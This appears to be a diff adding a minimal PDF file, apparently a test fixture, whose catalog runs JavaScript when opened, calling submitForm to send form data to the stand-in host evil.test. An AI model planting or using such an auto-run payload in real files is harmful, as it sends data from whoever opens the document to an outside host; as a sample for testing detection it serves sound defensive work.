@@ -1,0 +1,13 @@
+%PDF-1.6
+1 0 obj
+<<
+/Type /Catalog
+/OpenAction <<
+  /S /JavaScript
+  /JS (this.submitForm("http://evil.test");)
+>>
+>>
+endobj
+trailer
+<< /Root 1 0 R >>
+%%EOF
